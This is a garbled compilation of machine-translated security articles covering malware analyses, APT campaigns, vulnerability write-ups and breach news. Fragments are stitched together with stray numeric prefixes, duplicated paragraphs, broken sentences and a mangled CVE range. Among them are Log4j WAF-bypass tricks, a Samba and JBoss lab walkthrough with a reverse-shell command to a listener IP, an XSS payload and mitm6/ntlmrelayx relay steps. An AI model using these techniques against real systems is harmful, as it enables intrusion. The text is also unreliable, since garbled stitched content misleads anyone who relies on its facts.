Android/FoulGoal.A Check when the screen is on or closed and record it in its internal file scrn.txt, the strings "on" and "off" indicate that it is used to track the user viewing the screen: the communication channel between the device and the malicious server uses the message queue telemetry Transfer Protocol (MQTT) to send and receive commands
We believe that the malware authors use this AES encryption technology to upload all the information, which helps to avoid the detection of Google Bouncer and network detection products
11307: According to The Hacker News 2 on October 23, researchers have demonstrated a new type of PDF document attacks on the contents of the document, including replacing the payee, payment order or changing the terms of the contract
The attack technique is called a "shadow attack" by scholars at the Ruhr University of Bochum in Germany, and its main attack principle is the "view layer" concept, or different sets of content that overlap in PDF documents
Of the 29 PDF readers tested, 16 were vulnerable to shadow attacks- - -, including Adobe Acrobat, Foxit Reader, Perfect PDF, and Okular
The research team added that hiding and replacing are the most harmful variant attacks, as it can replace the content of the entire document
To test the attack, the researchers released two new open-source tools, PDF-Attacker and PDF-Detector
This shadow attack exploit was tracked and coded as CVE-2020-9592 and CVE-2020-9596, which Adobe addressed in an update released on May 12,2020
In addition, the researchers identified another set of 11 vulnerabilities (CVE-2020-28352 to CVE-2020-28359 and CVE-2020-28410-2020-2820-28412) that could lead to access denial, information leakage, data manipulation attacks, and even arbitrary code execution

Security experts in the Netherlands have found that problems with internal storage (laptops, tablets, and computers) and external storage (via USB connection) on Macs, Linux, and Windows systems can bypass existing encryption mechanisms to access data even without knowing the users password
The first (CVE-2018-12037) is related to no encryption binding between the password provided by the end user and the encryption key used to encrypt the users data
Therefore, the confidentiality of user data does not depend on the encryption mechanism and can be recovered by an attacker executing the code on the drive controller (via e. g., JTAG, memory corruption, memory chip content manipulation, and fault injection)

Among them, DDoS attack and Web application attack are two two prominent security threats facing the Internet today
From the point of view of attack means and attack purpose, the two are completely different, but they are often not independent of each other, but closely related. It can be simply considered that DDoS attack and Web application attack are in different links in the attack chain, and botnet (Botnet) is the "bridge" between the two
But many attackers are not just content with this. They often plant Botnet malicious programs and build their own army of botnets

In order to be more familiar with WebSphere, we also went to the historical patch. For example, the deep impression is CVE-2020-4276, which is the historical vulnerability CVE-2015-7450, and the process of RCE is no different from CVE-2015-7450
Later accidentally find another deserialization entry, Having confirming that it is impossible to focus on the historical loophole, Had to go from readObject, readExternal, toString, compare, etc., the functions to try to find, Later in a readObject found a JNDI injection, But due to the sdk high version, The only way you can be local factory or jndi local deserialization, But the WebSpheres public utilization chains are blocked, Local deserialization doesnt really work here, So all we left is the local Factory
The deserialization entrance is not given for the time being, and there may be many such deserialization entrance, and we happen to meet one of them. If we are lucky enough to find the RCE vulnerability, write out the entrance we found, and start with JNDI in that readObject

One is to study what methods can be used besides jndi; the second is to find what methods can divide payload features besides lower, upper, etc
Back to the two questions just now, first, study which other lookup can be used except jndi. In fact, only jndi can be used by injection, but other methods will still lead to some information leakage, such as main, env, sys and other methods
The second question is to study which lookup methods can be used to segment commands. The first thought is to combine the splicing of empty characters
One is that the case conversion is not necessarily the letters, After the next character will not report an error, If $ {lower::} and: is an output, $ {power: /} and / is also an output; The second is that some special characters become just like normal letters after passing through the loop or the upper, Those who have ctf experience should be familiar with this, For example, jnd ? (? (here \ \ u0131) is not the lowercase letter i (\ \ x69)), A special character passes up and becomes JNDI, Using these features can also bypass the preprocessing and interception of some waf rules

Below, the author analyzes and reproduces the vulnerability background, attack principle and behavior
Based on the above analysis, it is clear that the Nodejs application requires a large number of files, If these files contain the process.exit directive, Then could close the Kibana process and cause a denial of service attack, Found three possible attack vectors by search four, one point summary LFI usually appears in PHP applications, The application is require in the Nodejs program, I believe there will be more Nodejs programs in the future, The reason is that local inclusion vulnerabilities have occurred for many years, But so many software developers and architects dont think about that, This article speaks well for the existence of a key LFI vulnerability in Kibana, Enables the attacker to run local code on the server, The immediate hazard is a denial of service attack, If business cant hurt in a production environment, Attention needs to be paid to the Nodejs LFI
This weekly report suggests that we pay attention to Git remote code execution vulnerability (CVE-2018-11235), etc. Git has remote code execution vulnerability in the implementation, which stems from the lack of enough verification of submodule folder name when using git clone

Dubbo is an open source RPC service framework of Alibaba, which is often used to call distributed service remote objects. Dububo was found to have a remote code execution vulnerability of CVE-2020-1948, and the new version of Dubbo2.7.7 found that the repair method could not prevent the exploitation of CVE-2020-1948 vulnerability
0x03 Vulnerability Analysis CVE-2020-1948 Remote code execution vulnerability principle is the code execution caused by the remote method to be dynamically called
The vulnerability trigger principle of Dubbo is the code execution caused by the method of dynamically calling external incoming objects inside the toStringBean class
The vulnerability trigger point of dubbo is different from fastjson. fastjson uses this chain to cause code execution because the setAutoCommit method uses the this.connect() method, and the connect() method can use the jndi method to load malicious classes to cause code execution
Recently, the Green Alliance Technology volt Shadow Lab has captured a number of phishing documents and related Trojan horse programs called "TBS TV_Qs.doc"
According to the analysis, this series of malicious files are all part of the recent cyber attack activities organized by the APT organization Kimsuky, and their direct target is likely to be the military experts responsible for the Korean Peninsula issue
2. Process analysis of the captured Kimsuky attack activities, the attack process starts with malicious documents, by accessing a specific url to download different anti-virus software countermeasures strategy, try to run the known Kimsuky Trojan program KimAPosT, and finally use the malicious code stored in the OneDrive network disk to execute specific attacks
As of April 27,2022, the Kimsuky attacker may have completed the main attack process, replacing the final attack code with a non-intrusion code that contains only the victim statistic function
4. Component analysis There are many functional vbs scripts, bat scripts and other attack components appearing in this Kimsuky targeted attack activity
After the macro code runs, the document first tries to get and open the content in the remote link TV_Qs.docx, a decoy document used to deceive the victim
4.3 Malicious template document eset.dotm The malicious template document is the initial malicious document, the malicious template document kasp.dotm the malicious template document is the initial malicious document from the Trojan secur32.dll file named secur32.dll is the initial malicious document from the final attack load [XXXX]. The vbs final load is a vbs script, also present in Kimsuky known activities

11624: " On October 31,2019,20360 CERT detected foreign security researcher S 010 pY in GitHub released the poc of Apache Solr Velocity template injection remote command, the poc is real and effective, 360 CERT judged that the vulnerability level is serious, and the hazard surface / impact area is wide
At present, Apache Solr has not officially released a patch for the vulnerability, and 360 CERT recommends that users using Apache Solr take the recommended measures to avoid hacking
0x01 The vulnerability is created for two reasons: when an attacker can directly access the Solr console, the node can send a POST request like / node name / config
When setting the params.resource.loader. enabled Is true, it allows the user to specify the load of relevant resources by setting the parameters in the request, which means that the attacker can execute commands on the server by constructing a threatening attack request
11625: " 0x01 Overview VMware vSphere is a VMware virtualization solution that can easily create and manage virtual machines and virtual devices
Recently, 360 Security Brain detected a mining Trojan for the VMware vSphere virtualization platform, and named it VsphereMiner
This mining Trojan will download xmrig mining program for profit after invading the virtual machine, use rootkit technology to hide its own behavior, and realize horizontal mobile propagation with the help of SSH connection
0x02 Technical analysis Take the sample as an example, the sample is the pre-script of VsphereMiner, the main functions include: downloading the other modules of the mining Trojan, adding Trojan startup items to the VMware vSphere service, clearing competitors, SSH horizontal movement, etc
In fact, since the beginning of 2021, more and more extortion groups have been releasing encryption software for vSphere virtualization platforms, including the notorious DarkSide, RansomExx, REvil, HelloKitty, BlackMatter
VsphereMiner As the first mining Trojan for VMware virtual machine platform, the attack process is relatively simple, all malicious modules are distributed by the fixed C & C server, and the mining behavior also uses the common practice of xmrig mining machine + config.json default configuration file + public mining pool
The selection of targets rarely aims at the VMware vSphere virtualization platform of the other competing products, posing a serious threat to the production of the business of the enterprise / organization

65: ADLab, background AD Lab recently found a large number of well-known software installation program was implanted in the mining virus, the hackers behind the virus tried to release infected software installation packages through social channels such as software sharing forum, we call the malicious software "install ghost" mining virus
Attackers in multiple BBS "sharing" bundled with "ghost" mining virus crack versions of various popular applications, including "Malwarebytes", "CCleaner Professional" and "Windows 10 Manager" and other well-known applications a total of 26 kinds, together with different versions of 99, features covers system optimization, software uninstall, CD burning, antivirus, system activation, resource download, etc
2. Infection process "install ghost" mining virus infection process as shown in figure 1, the attacker will first contain "install ghost" crack installation package uploaded to "mega", "clicknupload", "fileupload" and other cloud disk, and then the file download link through "NITROWAR", "MEWAREZ" forum "share" transmission, the corresponding software by the victim download installed run, "install ghost" will start execution
First, Installghost copies the system file% Windows%\\Microsoft.NET\\Framework\\v3.5\\vbc.exe to the% temp% directory of the system named svhost.exe and starts it, and then injects the malicious code into the svhost.exe process space
The malicious code injected into the svhost.exe process space on the one hand creates the mining profile, on the other hand, injects the mining virus into the "% Windows%\\System32\\wuapp.exe" puppet process, and finally takes the configuration file as the parameter for the mining operation, which is very hidden
Figure 5 The installer releases svchost file malicious code on the one hand, create a "KeAgPGdPeF" folder in the "%Users% \ \ ThinkPad \ \ AppData \ \ Local" directory, and create a new profile cfgi and cig in the "KeAgPGdPeF" directory, and then write the configuration information required for the "install ghost" mining virus to the profile as shown in Figure 6
Figure 8 incoming mining profile, running the mining puppet process figure 9 injected into the puppet process mining program 5, mining account "installation ghost" mining virus corresponding to the wallet address query results see figure 10, from figure 10 we can see that the account in the last 90 days, the calculation power are: (24h) 342.97 H / s, (12h) 340.20 H / s, (1h) 482.60 H / s, (10m) 429.00 H / s, and up to now, the mining behavior is still active
According to BleepingComputer statistics, dozens of malicious viruses have spread to the Monroe coin mining machines, and in 2018, the situation is even worse
The principle is shown in Fig. 2. How to conduct Poison on the basis of the Web Cache operation process? How to perform the Poison based on the Web Cache running process? If the attacker first triggers the response of the server cache with a malicious Payload, he will receive the malicious response when other users send the same request
2. After we confirm the input that is not cached from the backend server, we need to see how the server handles the input. If it can dynamically feedback to the response, it is the key to launch the Web cache poisoning
The overall vulnerability utilization is divided into two parts: one is Web Cache Poisoning attack based on cache design defect and the other is Web Cache Poisoning attack based on cache implementation defect 0x04 based on cache design defect Web Cache Poisoning attack 1. Use Web Cache Poisoning to expand XSS results because XSS attack is also a part of the input is feedback in the response, So Web Cache, poisoning can be combined with XSS
Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria Scan using the Param Miner, Using Param Miner scanning is slower, Dont worry ~; Finally found the presence of Web Cache Poisoning in the interface /, And can forge the field as X-Forwarded-Host. Try the X-Forwarded-Host header in Repeater, contract award
But this is a translation page, and we need to add an X-Original-URL field to the home page pointing to the translation page, so that the people who visit the home page will be redirected to this page
Based on Cache Key, the basic steps of defective Web Cache poisoning are based on Cache Key. defective Web Cache poisoning is generally three steps. 1. Identiwhether the response received comes from cache or server this step is called identifying Cache oracle
It helps developers fix runtime traffic by using Agent deployed on the Web application to identify security vulnerabilities in real time. IAST provides higher test accuracy and details the exact location of the vulnerability in the application code in real time
For a simple example (python3 + Flask):@app.route (\ "/ test \", methods= [\ "POST \"]) def Test(): data = json.loads(request.get_data()) argv1 = data [\ "argv 1 \"] exec (argv 1) It is obvious that the above code is an interface with a code execution vulnerability, The principle of hole state detection is by monitoring all the methods under request in Flask and exec, eval and other methods that can execute commands, By stain propagation can be detected when the parameters are incoming from the request request, The inflow command execution function is a code execution vulnerability
For attackers, taking over these routers is a piece of cake, because they can write automatic scripts to exploit the lack of Telnet passwords to incorporate exposed routers into the botnet
In ATT & CKs technology matrix, there are specific scenarios for each technology showing how an attacker uses the technology through a malware or action solution, citing many articles published by blogs and security research teams
(2) The execution of "execution" tactics is a necessary tactic for all attackers, because attackers will choose "execution" tactics in order to succeed through malware, ransomware or APT attacks to enter the host
(8) Horizontal movement "Horizontal movement" tactic is one of the common tactics of attackers. After an attacker uses a vulnerability to enter the system, he usually tries to move horizontally in the network, whether to collect information or continue to find a breakthrough point for the next attack
Hackers can infiltrate data and tell the malware what instructions to do next
For each command and control, the attacker accessed the network from a remote location
(11) Data leakage After an attacker gets access, he will search around for relevant data and then start to infiltrate the data
But I later found out that BloodHound is also a very powerful tool for an attacker
And many companies also find themselves trapped in a seemingly inevitable cycle of security remediation, many organizations after the attack, will ask the same question: how do they achieve the attack? Next, organizations may conduct a detailed, thorough and lengthy investigation and obtain an attack investigation report in which researchers describe how attackers invaded their system step by step
The attacker stole the built-in local administrator password, which is used by every system in the network
The attacker found a system from the network system that had already logged into an Domain Admin account, and then used the Mimikatz to steal the Domain Admins credentials from the system
In fact, even if you could deploy the above strategy recommendations perfectly, when you accidentally suffer an attack, the attack study report could do this: " A users password is successfully guessed by the attacker
The attacker is connected to the enterprise VPN, where no multi-factor authentication is deployed
The attacker logged in to the system with a high permission service account, and the attacker injected malicious code into the process run by the service account. This service account has the add member permission and can add users to the Domain Admin group
As a result, the enterprise seems to be in an infinite cycle, because they have to respond to attackers attack: the function of BloodHound and limit in general, the red team report will introduce the user attacker attack path, and the attack path often include lateral penetration and implementation through activity directory
And BloodHound attack path is very rich, including voucher theft, local administrator rights, security object control and so on
51: "article directory 1, Darkhotel organization introduction 2, bait delivery 2.1 2.2 brief description pollution software upgrade / installation package 2.2.1 netease mailbox" master " 2.3 file camouflage 2.3.1 EXE disguised as picture 2.3.2 Lnk disguised as document 2.3.3 Lnk directly click 2.3.4 files disguised as documents 3, bait delivery article summary attached: about shadow lab reading: 311, Darkhotel organization introduction Darkhotel is an active for nearly 10 years of APT organization, Disclosed by Kaspersky in 2014, The earliest dates back to 2010
The group is named for targeting business executives and national dignitaries in upscale hotels, targeting China, North Korea, Japan, Myanmar, India and a handful of European countries
Darkhotel The attack feature of the organization is to invade the network system of some high-end hotels, control the hotel WIFI, use social engineering means to send forged prompts to the WIFI target, induce them to download the specified tools and upgrade, and implant malicious backdoor to the target host
Because the attacker controls the WIFI and knows the name, time and room number, the target is in a semi-monitored environment without knowing it
In addition, the Darkhotel also uses phishing attacks
Attackers send emails to corporate executives and state dignitaries on a carefully designed topic, closely related to industry policy trends or political hot-spot issues, including malicious documents constructed
Darkhotel The Trojan tools used in various forms, including traditional remote control Trojan, spyware, upgrade downloads, and unique file infection components
2. Bait delivery 2.1 technique Darkhotel Delivery bait is mainly divided into three types: document with vulnerability with backdoor tools / installation package camouflage document camouflage document vulnerability document is one of the attack payloads commonly used by APT organization
For example, in 2014, the organization took advantage of the Adobe 0day vulnerability CVE-2014-0497 to launch targeted attacks on a number of specific mailbox users in China
The attacker sent phishing emails, including embedded malicious swf link Word documents, through the shellcode download to execute subsequent malicious programs
Since then, the group has been reported to continue to use other vulnerabilities, including CVE-2017-11882, CVE-2018-8174, and CVE-2018-8373
Back in 2014, the group launched puddle attacks in several hotels, asking targets to upgrade tools such as Adobe Flash, Google Toolbar and Windows Messenger, but actually inserted back doors
The group has also released seeds for adult content on Japanese p2p networks, and provided compressed package decryption tools that will eventually release malicious programs
Darkhotel Has also induced the target to click to execute executable files or malicious shortcuts (Lnk) disguised as pictures or documents to launch subsequent activities
In 2019, it was reported that Darkhotel had launched an attack on senior executives of Chinese and foreign trade enterprises []
The attacker forged the netease cloud mailbox master installation package, and released the normal mailbox master will download and load malicious Dll, used to download and install subsequent malicious programs
This can accommodate Dll injection, Word vulnerability exploitation or document camouflage, powershell download execution components, and hijacking wsearch services
2.3.1 EXE disguised as images In an attack in 2015, Darkhotel disguised the executable file as an image to induce the target to click
2.3.2 Lnk disguised as a document In a 2016 attack, Darkhotel disguised the malicious lnk as a doc document icon and downloaded the executable file through a fixed command line, which specifies a download connection and saves the file as dwm.exe for execution
Dwm.exe Is a Dropper program with a certain camouflage, with the same name as the Windows Desktop Manager component, after running will release the disguised document to deceive the target, so that they do open the document
The downloader connects to the specified C & C, downloads the Final Stage Trojan, and injects it into the windows process
Whether it invades the hotel network for malicious software delivery, or delivers it through phishing emails, Darkhotel has a strong ability to acquire and exploit potential network vulnerabilities
"This next fans boiling, netease email response instantly on the hot search, fans have said:" I see how I and fans wash the ground " so, what do you think Wan Qian should do next to save the situation? Microsoft recently warned a major campaign adviser for US Democratic presidential candidate Joe Biden that it was under attack by suspected Russian government-backed hackers, according to three people familiar with the matter
The hack targeted employees of SKDKnickerbocker, a Washington-based campaign strategy and communications company, and the company has worked with Biden and other prominent Democratic figures for the past two months, according to people familiar with the matter
A person familiar with SKDKs response to the attack said the hackers had not yet had access to the companys network
Recently, the BBC has reported on the account of Liu Xiaoming, our ambassador to the UK
According to their reports, Ambassador Liu Xiaomings account was manipulated by anti-China attackers, praising pornographic videos on Twitter and rumors made by anti-China activists
In another case, there will be vulnerabilities at the system level in the mobile terminal environment. If the use leads to the implant of a Trojan horse or virus, eavesdropping is completely possible, but this is not applicable to most mobile phones
53: Marriott International has announced that its Starwood hotel reservation system has been hacked, leaking the personal information of about 500 million customers, including their names, credit cards, email addresses, email and passport numbers
The motive for the hacking into Marriotts hotel system is unclear, but security experts see the hotels Wi-Fi as a breakthrough
Starwood and Marriott were hacked in 2016, when tens of thousands of users credit card numbers were stolen

Global computer giant Acer has demanded $50 million (about 325 million yuan), a new record for ransomware ransom
REvil, a ransomware gang, has officially hacked into Acers system on its own data breach site and posted some pictures of the stolen documents
Later, Valery Marchive found a sample of the REvil ransomware used in the Acer attack; BleepingComputer also found the sample and further confirmed the fact that Acer had suffered a REvil ransomware attack and was demanding a $50 million ransom
According to the "tragedy" that Foxconn was attacked by a ransomware gang, demanding a ransom of 230 million yuan, and was encrypted about 1,200 servers, stole 100 GB of unencrypted files, and deleted 20 to 30 TB of backup
Recently, MangaDex has been forced to temporarily shut down after source code was stolen from a cyber attack
While comic book lovers around the world are crying, MangaDex developers were publicly mocked by attackers
Last week, illegal attackers took advantage of the vulnerability to gain MangaDex site administrator, developer accounts, and access to the sites source code
Later, MangaDex began to urgently review the code and fix the vulnerability, and then the attacker fixed the vulnerability, watched the comment section to publicly mock the site developers, and directly tell the site developers fixing the vulnerability
Cause the attacker to construct a malicious dynamic link library file to execute arbitrary code
Lets compile the vulnerability environment with docker: we need to test the MSF tool, First, lets find the use module exploit / linux / samba / is _ know _ pipename: set the target address and port information, One thing to note is that we need to know the absolute path to the writable directory, The writable directory in the test environment is / home / share: execute exploit for vulnerability attacks, Return a shell channel if successful, So we can successfully get access to the server: jboss into this jboss directory we found two CVE and one other type of vulnerability, Lets take a repeat of these two CVEs, They belong to the jboss deserialization vulnerability: CVE-2017-12149: JBOSSApplication Server deserialization command execution vulnerability (CVE-2017-12149), A remote attacker uses a vulnerability to execute arbitrary code on a server host without any authentication
It does not restrict the classes that perform deserialization, allowing remote attackers to execute arbitrary code through carefully designed serialized data
We use the same way we said, By downloading the binary payload, Then send the payload to the target host, The attack machine listens to a certain port, Return a shell channel: in order to distinguish between the previous, We monitored port 9999: java-cp.: commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.106.128:9999, Then we listen to port 9999

Yahoo was hacked in August 2013, resulting in the disclosure of more than 1 billion users, the companys largest information breach in the world
We have to think deeply, the enterprise data security protection exactly where to go? What impact will the data breach have on enterprises? With the improvement of data value, hackers increasingly turn the attack target to the user and employee data stored in the enterprise. When the enterprise has data leakage, the loss is not only economic benefits
22: " In the last 30 days or so, there have been several Java vulnerabilities, one of which is the Spring Cloud Fuctions 0Day, and the attack is mainly hidden in the HTTPs Header
In this case, it will lead to the installation of the full 0 key TK, allowing the attacker to not only decrypt the packet, but also carry out traffic hijacking
Basic steps consistent with the precedent, the difference is that the installation of TK is all 0, the attacker know TK, can be traffic hijacking, monitoring and tampering with the client data 3.3 accept encrypted message 3 (to accept explicit) in Linux and Android system, although set to accept encryption message 3, but it will also accept explicit message 3, as long as the message 3 followed after the original message 3
19: " Overview Recently, the micro step intelligence agency in the analysis of a malicious sample, the sample C2 address correlation analysis found that the address also received the ransomware back
Microstep intelligence agency found that a malicious sample will download the subsequent script file from the domain name dllhost.xyz execution
The association analysis of the domain name dllhost.xyz found that the domain name has a return request in a representation format. Through the analysis of the return information, it was found that it is the first open source ransomware for Windows, named "Hidden Tear"
In the past year, there have been several attacks on victims using the ransomware using COVID-19
Recently, the Microstep intelligence agency captured a. LNK format malicious software. In the analysis process, it was found that the Trojan will call Powershell to continue to download the subsequent. js file from the domain name dllhost.xyz, and the. js file will try to launch a request to another domain name dlldns.xyz for the next operation
Figure 1. Code executed by lnk Figure 2. js subsequent address through the sample related domain name (dllhost.xyz, dlldns.xyz) association analysis found that the domain name also contains another malicious file using the. pdf icon, and will use a fixed format when sending information back: Figure 3. Request " write.php? Computername=XXXUsername=XXXPassword=XXXallow=ransom " identified an open source ransomware called the Hidden Tear
Figure 5. Hidden Tear page shows that in the past year, there have been several attacks on victims using the modified version using the topic of COVID-19
For example, in March 2020, an attacker sent phishing emails to health organizations and universities involved in COVID-19 research, containing ransomware
In May 2020, an attacker registered to copy the official domain name, sent the COVID-19 epidemic map bait files to Italy, and encrypted the victim host to extort bitcoin
In March 2020, the attacker sent a forged email address noreply@who.int (176.223.133.91) to HCanada and universities participating in the COVID-19 study, containing an RTF file with the file named "20200323-sitrep-63-covid-19.doc"
Figure 7. Bait document (which does not seem likely to lure users) In May 2020, FuckUnicorn, a Hidden Tear-based ransomware, used COVID-19 to attack Italy to distribute malware by registering the fake domain name (fofl.it) of the Italian Pharmacists Federation (fofi.it)
1.20200323-sitrep-63-covid-19.doc Basic information: File NameFile TypeSHA25620200323-sitrep-63-covid-19.docRansomwar Once the victim opens the. rtf, Document will try to exploit the CVE-2012-0158 vulnerability, Release the ransomware to C:\\Users\\User\\AppData\\Local\\svchost.exe and execute, The released svchost.exe has hidden properties, And an icon with a Adobe Acrobat
Because the code author opens the program publicly on the Internet, many people with insufficient development level can immediately compile ransomware, lowering the threshold of extortion attacks again
Solr has a lot of CVE vulnerabilities, but velocity template injection is one of the most widespread vulnerabilities
In this paper, we introduce an attack method that can abuse the default IPv6 configuration in the Windows network to act as a malicious DNS server to forge DNS response messages and redirect network traffic to an endpoint specified by the attacker
THC IPv6 The Attack set is one of the few tools available, which is also the inspiration for the mitm 6
The main idea of SLAAC is to create a malicious IPv6 router that attacks the middle-in (man-in-the-middle) on all traffic in the target network through various services
The mitm 6 is very easy to install, and can selectively attack a specific host, fake DNS response data, while also minimizing interference from the normal operation of the target network
3. Mitm 6 attack stage 1: Control the main DNS server. First, mitm 6 will monitor on the main interface of the attacker host and observe the Windows host configured by IPv6 through the DHCPv6 protocol
The relevant packets captured by Wireshark are as follows: mitm 6 responds to these DHCPv6 requests to assign IPv6 addresses within the local link
In this way, we have the opportunity to set the attackers IP to the default IPv6 DNS server to provide the DNS service for the victim host
This limits the impact of attacks on the overall network, because mitm 6 does not try to attack all traffic in the network as a middleman, but selectively tricks some hosts (attackers can specify domains to be filtered during mitm 6 runs)
Our ultimate goal is to have the user or browser automatically initiate an authentication request to the attacker host, which is why we cheat URL in testsegment.local, an internal network
An attacker can answer these broadcast name resolution protocols, claiming that the WPAD file is on a server controlled by the attacker, and then request access to the WPAD file through identity authentication
Once the victim host sets the attackers server as the IPv6 DNS server, the victim host immediately gets to query the WPAD configuration in the network
Since these DNS requests are sent to the attacker host, the attacker can respond to such requests using his own IP address (IPv4 or IPv6 address, depending on which address the victim host requests)
Now the Windows will obediently send the NTLM challenge / response data to an attacker, who can then forward that data to various services
In this relay attack scenario, the attacker can access various services, obtain website information and share resources as a victim. If the victim has a high enough permission, the attacker can even execute code on other hosts or take over the entire Windows domain
In the second phase of the attack, we use the tool ntlmrelayx to launch a relay attack
In order for ntlmrelayx to listen on both IPv4 and IPv6, we need to use the-6 parameter
In operational missions, the core tasks of Unit 8200 are intelligence gathering, public domain information analysis, agent operations, special signal intelligence, and the end result may be an arrest, a drone assassination, or a cyber attack
In addition, the 8200 unit is also a "cyber weapons Arsenal", shaking the worlds Stuxnet, Duqu, Duqu 2.0 and other world-famous cyber weapons are from its hands
(Stuxnet Event timeline) (2) The C4I unit: Compared with the aggressive 8200 unit, the C4I unit is more like a radical defense force
(2) multidimensional strategic defense: the prime ministers office of three major network forces military armed offensive defense forces, affiliated to the office of the national network headquarters (NCD), the national security agency (ISA), the national security council (NSC), is Israels network security strategy operator and key infrastructure protection shield
In 2007, Israel destroyed the Syrian nuclear plant through stealth warplanes, and the key to its success was the IDF cyber force, which first destroyed the Syrian air defense radar system through cyber attacks
(2) After Operation earthquake net destroyed Irans nuclear program, Syria was Iran
In 2010, Irans nuclear facility was hit by a massive cyber virus attack, which immediately infected 60,000 computers and destroyed more than 1,000 centrifuges, resulting in the collapse of Irans nuclear program. Previously, he talked about "" ()
Known bbed the first massive cyber war of the 21st century, the most critical "super virus" was created by Unit 8200
13: " vulnerability introduction SSRF (Server-side Request Forge, server request forgery) is usually used to control the web and detect Intranet services and attack Intranet vulnerable applications as a springboard machine, can be used as a ssrfsocks agent vulnerability due to the server provides data from other server applications and no filtering and restriction of address and protocol
Once the victim opens the attachment, a prompt box will pop up asking if you want to open the embedded ASQMU.docm file (Figure 1) If the victim is allowed to open the file, Jaff first opens an embedded document that contains instructions to turn off your macro protection (Figure 2)
Through the three download links, we downloaded the binary malicious code file. Jaff will decrypt the downloaded malicious code and get the final running code
Each time this set of code passes, a DWORD value is decrypted until all the malicious code is successfully decrypted
In general, the name of a hidden API is a feature of malicious code, and they use this method to avoid detection by antivirus programs, because antivirus software identifies malicious code according to the combination of the API used by the program
To hide the name of the API, some malicious codes use encryption, and some use a hash
Process replacement (Process Hollowing) process replacement is also a feature of malicious code, which can drop the legitimate code of the target process to the unmap, and then write its own malicious code into the memory
After obtaining all the required APIs, Jaff uses the process replacement
It uses UnmapViewOfFile, cleans up the memory blocks of the current process, then reassigns the same memory blocks using VirtualAlloc, and changes its protection mode to PAGE _ EXECUTE _ READWRITE by calling VirtualProtect, and finally, copies the contents of the malicious code to the newly allocated memory blocks through a series of REPE MOVSB instructions
In this way, you can quickly deploy new versions of the malware, thus avoiding the detection parameters used previously
Such as a page server response return login, login password, phone number, id card and other sensitive information, if there is database access control, through the user ID, you can view all user sensitive information, it is also a kind of disguised library, and it is difficult to find the firewall, because it is no difference from normal access request, also will not contain special characters, has full secrecy
Using new features or update components used to fix security vulnerabilities, attackers instead turn them into malicious carriers and turn official software distribution channels into a source of infection
In recent years, attackers have begun to use cloud services to implement various malicious attacks on ¡ª¡ª, including hosting URL for phishing and even distributing malicious software
Multi-vector phishing attacks and their evasion techniques Using PDF embedded URL for attacks are becoming more common, and attackers are starting to use other means to hide the URL
By 2018, more malicious software is expected to actively break into cryptocurrency wallets or steal user voucher information
1. In this case, the attacker collected our sales channels on our official website, pretending to be a university professor, and trying to purchase the security system of our company
In order to attack the social worker, the attackers prepared a series of documents such as network topology and budget tables to gain the trust of our sales
But actually this macro also contains a piece of vba code, which is the vba version of CobaltStrike
No matter what type of sample the attacker delivers, the ultimate goal is to control the terminal
So our thinking is the office software created the system command related process, is an abnormal process chain, to alarm and response to 1.2 case 2: phishing email execution Powershell no file landing sample attackers by forging a terminal security software upgrade notification, to a company employees sent an email, mail attachment for a carefully constructed sample
When the victim opens this sample, the installation package can run normally and upgrade the software as usual, but the attacker has modified one more registry key during the installation process
In this registry key, the attacker wrote a Powershell command, this powershell command will go to the attackers public cloud VPC, download a remote control script and execute
After the attacker entered the office area, he used his own break-in U disk to bypass the boot password of an office machine, and copied the sample files in the U disk to the victim terminal
Point: In the field of attack and defense on the terminal, a single technical point includes: common authority maintenance tool CobaltStrike detection, no file attack, terminal U disk and other physical attack methods, and puts forward a single point technical protection and detection scheme

A Brazilian Internet service provider has deployed unTelnet password routers for nearly 5,000 users, making them very vulnerable to abuse
Although Telnet passwords are set on some devices, most devices can allow anyone to connect to a router and change their configuration
For attackers, taking over these routers is a piece of cake, because they can write automatic scripts to exploit the lack of Telnet passwords to incorporate exposed routers into the botnet
"He also pointed out that" although the Internet of things attackers over time become more and more complex, NewSky security companies found level 2 attacks is also increasing, but we still observed that the most easy attack vector (in the case of no authentication control equipment level 0 attack) is still very relevant in 2018, because the device everyone even in the case of no password will device exposure
"Anubhav added," Setting strong passwords and continuously updating IoT devices limits an attackers ability to use 0day or lengthy violent sessions, but for most attackers, neither method is a very tempting option, so the device is secure

Hello, everyone, today I want to share a simple vulnerability about Google. The reason for the vulnerability is that when the Google server requests, I found that the four servers of Google exist, and finally received a total of $4633.7 dollars
Vulnerability 1 This vulnerability was inspired by me one day after reading a Google XSS vulnerability analysis article written by others, which tells about the existence of an XSS vulnerability in Google Colab. You can read this

Hello, everyone, today I want to share a simple vulnerability about Google. The reason for the vulnerability is that when the Google server requests, I found that the four servers of Google exist, and finally received a total of $4633.7 dollars
Vulnerability 1 This vulnerability was inspired by me one day after reading a Google XSS vulnerability analysis article written by others, which tells about the existence of an XSS vulnerability in Google Colab. You can read this
The problem here is that in the link page generated by this file request, the user name or company name segment is unfiltered to achieve XSS Payload trigger, if XSS Payload- <script> alert is added ( Hi there!); </ script> After sending the corresponding file request link to other users, when the link is opened, XSS is executed, as follows: That is, we can execute any code in the target users system and do some bad things, but how can we take advantage of it? The encryption service uses client asymmetric encryption to protect user files. Since the encryption service is deployed in the form of a website, its encryption mechanism should be implemented by JavaScript call, that is to say, the local private key information can be obtained through JavaScript

Hello, everyone, today I want to share a simple vulnerability about Google. The reason for the vulnerability is that when the Google server requests, I found that the four servers of Google exist, and finally received a total of $4633.7 dollars
Vulnerability 1 This vulnerability was inspired by me one day after reading a Google XSS vulnerability analysis article written by others, which tells about the existence of an XSS vulnerability in Google Colab. You can read this
The problem here is that in the link page generated by this file request, the user name or company name segment is unfiltered to achieve XSS Payload trigger, if XSS Payload- <script> alert is added ( Hi there!); </ script> After sending the corresponding file request link to other users, when the link is opened, XSS is executed, as follows: That is, we can execute any code in the target users system and do some bad things, but how can we take advantage of it? The encryption service uses client asymmetric encryption to protect user files. Since the encryption service is deployed in the form of a website, its encryption mechanism should be implemented by JavaScript call, that is to say, the local private key information can be obtained through JavaScript

Vulnerability 1 This vulnerability was inspired by me one day after reading a Google XSS vulnerability analysis article written by others, which tells about the existence of an XSS vulnerability in Google Colab. You can read this
